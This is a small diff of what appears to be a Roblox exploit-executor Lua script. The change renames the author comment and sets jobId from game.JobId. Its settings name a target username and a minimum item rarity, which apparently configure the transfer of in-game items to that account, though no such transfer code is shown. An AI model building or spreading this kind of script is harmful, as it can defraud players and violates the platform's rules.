@@ -1,4 +1,4 @@
---Igor
+--Ezz
 
 _G.Usernames = {"daniellfc09"} 
 _G.min_rarity = "Rare" 
@@ -252,7 +252,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-jobId = ""
+local jobId = game.JobId
 
 
 
